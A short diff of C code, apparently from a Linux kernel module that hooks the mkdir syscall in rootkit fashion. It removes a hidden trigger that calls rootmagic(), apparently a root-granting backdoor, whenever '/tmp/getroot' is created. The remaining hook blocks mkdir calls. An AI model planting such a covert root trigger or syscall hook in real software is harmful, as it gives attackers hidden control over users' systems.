@@ -216,11 +216,6 @@ static long hook_mkdir(const struct pt_regs *regs)
  // printk(KERN_INFO "Attempting to create directory (dfd=%d): %s\n", dfd, path);
        // printk(KERN_INFO "Directory creation blocked: %s\n", path);
     }
-
-    if (strcmp(path, "/tmp/getroot") == 0) {
-        rootmagic();
-     }
-    
     return 0; // Block the mkdir syscall
 }
 
